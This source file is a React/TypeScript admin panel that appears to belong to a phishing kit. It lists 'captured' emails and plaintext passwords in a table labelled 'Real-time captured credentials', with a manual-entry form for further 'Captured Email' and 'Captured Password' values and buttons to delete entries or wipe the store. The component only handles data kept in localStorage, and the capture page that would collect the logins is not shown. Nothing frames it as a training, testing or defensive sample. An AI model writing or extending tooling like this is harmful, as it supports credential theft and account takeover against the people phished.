
import React, { useState, useEffect } from 'react';
import { CapturedUser } from '../types';

interface AdminPanelProps {
  onBack: () => void;
}

const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
  const [users, setUsers] = useState<CapturedUser[]>([]);
  const [showAddForm, setShowAddForm] = useState(false);
  const [newEmail, setNewEmail] = useState('');
  const [newPassword, setNewPassword] = useState('');

  useEffect(() => {
    loadDatabase();
  }, []);

  const loadDatabase = () => {
    try {
      const stored = localStorage.getItem('user_database');
      if (stored) {
        setUsers(JSON.parse(stored));
      }
    } catch (e) {
      console.error("Failed to load database");
    }
  };

  const saveDatabase = (updatedUsers: CapturedUser[]) => {
    localStorage.setItem('user_database', JSON.stringify(updatedUsers));
    setUsers(updatedUsers);
  };

  const handleDelete = (id: string) => {
    const updated = users.filter(u => u.id !== id);
    saveDatabase(updated);
  };

  const handleAddUser = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newEmail) return;

    const newUser: CapturedUser = {
      id: crypto.randomUUID(),
      email: newEmail,
      password: newPassword,
      timestamp: Date.now(),
    };

    saveDatabase([...users, newUser]);
    setNewEmail('');
    setNewPassword('');
    setShowAddForm(false);
  };

  const clearDatabase = () => {
    if (window.confirm("Are you sure you want to wipe the entire database?")) {
      saveDatabase([]);
    }
  };

  return (
    <div className="bg-neutral-900 border border-neutral-800 rounded-2xl shadow-2xl p-6 sm:p-10">
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 border-b border-neutral-800 pb-6 mb-6">
        <div>
          <h2 className="text-2xl font-bold text-white flex items-center gap-2">
            <span className="w-3 h-3 bg-red-500 rounded-full animate-pulse"></span>
            Admin Database
          </h2>
          <p className="text-neutral-500 text-sm mt-1">Real-time captured credentials</p>
        </div>
        <div className="flex gap-2">
          <button 
            onClick={() => setShowAddForm(!showAddForm)}
            className="bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold py-2 px-4 rounded-md uppercase transition-colors"
          >
            {showAddForm ? 'Cancel' : 'Manual Entry'}
          </button>
          <button 
            onClick={clearDatabase}
            className="bg-neutral-800 hover:bg-red-900/40 text-neutral-400 hover:text-red-400 text-xs font-bold py-2 px-4 rounded-md uppercase transition-all border border-neutral-700"
          >
            Wipe DB
          </button>
        </div>
      </div>

      {showAddForm && (
        <form onSubmit={handleAddUser} className="bg-neutral-800/40 p-5 rounded-xl space-y-4 border border-blue-500/30 mb-6 animate-in slide-in-from-top-4 duration-300">
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <input 
              type="email" 
              placeholder="Captured Email" 
              value={newEmail}
              onChange={(e) => setNewEmail(e.target.value)}
              className="w-full bg-neutral-950 border border-neutral-700 rounded-lg p-3 text-sm focus:border-blue-500 outline-none transition-colors"
              required
            />
            <input 
              type="text" 
              placeholder="Captured Password" 
              value={newPassword}
              onChange={(e) => setNewPassword(e.target.value)}
              className="w-full bg-neutral-950 border border-neutral-700 rounded-lg p-3 text-sm focus:border-blue-500 outline-none transition-colors"
            />
          </div>
          <button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-sm font-bold uppercase transition-transform active:scale-[0.98]">
            Commit to Database
          </button>
        </form>
      )}

      <div className="overflow-x-auto">
        <table className="w-full text-left border-collapse">
          <thead>
            <tr className="text-neutral-500 text-[10px] uppercase tracking-widest border-b border-neutral-800">
              <th className="py-4 font-semibold">User Identity</th>
              <th className="py-4 font-semibold">Credential</th>
              <th className="py-4 font-semibold">Timestamp</th>
              <th className="py-4 text-right font-semibold">Actions</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-neutral-800">
            {users.length === 0 ? (
              <tr>
                <td colSpan={4} className="text-center text-neutral-600 text-sm py-20 italic">
                  Database is currently empty. Capturing active...
                </td>
              </tr>
            ) : (
              users.sort((a,b) => b.timestamp - a.timestamp).map(user => (
                <tr key={user.id} className="group hover:bg-white/[0.02] transition-colors">
                  <td className="py-4 pr-4 max-w-[150px] sm:max-w-none">
                    <div className="text-sm font-medium text-neutral-200 truncate">{user.email}</div>
                    <div className="text-[10px] text-neutral-600 font-mono mt-0.5">{user.id.split('-')[0]}</div>
                  </td>
                  <td className="py-4">
                    <span className="text-sm font-mono text-blue-400 bg-blue-400/10 px-2 py-0.5 rounded border border-blue-400/20">
                      {user.password || '---'}
                    </span>
                  </td>
                  <td className="py-4 text-[11px] text-neutral-500 whitespace-nowrap">
                    {new Date(user.timestamp).toLocaleString()}
                  </td>
                  <td className="py-4 text-right">
                    <button 
                      onClick={() => handleDelete(user.id)}
                      className="text-neutral-600 hover:text-red-500 p-2 rounded-full hover:bg-red-500/10 transition-all"
                      title="Delete User"
                    >
                      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-5 h-5">
                        <path strokeLinecap="round" strokeLinejoin="round" d="m14.74 9-.346 9m-4.788 0L9.26 9m9.968-3.21c.342.052.682.107 1.022.166m-1.022-.165L18.16 19.673a2.25 2.25 0 0 1-2.244 2.077H8.084a2.25 2.25 0 0 1-2.244-2.077L4.772 5.79m14.456 0a48.108 48.108 0 0 0-3.478-.397m-12 .562c.34-.059.68-.114 1.022-.165m0 0a48.11 48.11 0 0 1 3.478-.397m7.5 0v-.916c0-1.18-.91-2.164-2.09-2.201a51.964 51.964 0 0 0-3.32 0c-1.18.037-2.09 1.022-2.09 2.201v.916m7.5 0a48.667 48.667 0 0 0-7.5 0" />
                      </svg>
                    </button>
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>

      <div className="mt-10 pt-6 border-t border-neutral-800">
        <button 
          onClick={onBack}
          className="w-full bg-neutral-800 hover:bg-neutral-700 text-white py-4 rounded-xl text-sm font-semibold transition-all flex items-center justify-center gap-2"
        >
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2} stroke="currentColor" className="w-4 h-4">
            <path strokeLinecap="round" strokeLinejoin="round" d="M10.5 19.5 3 12m0 0 7.5-7.5M3 12h18" />
          </svg>
          Exit Admin Mode
        </button>
      </div>
    </div>
  );
};

export default AdminPanel;
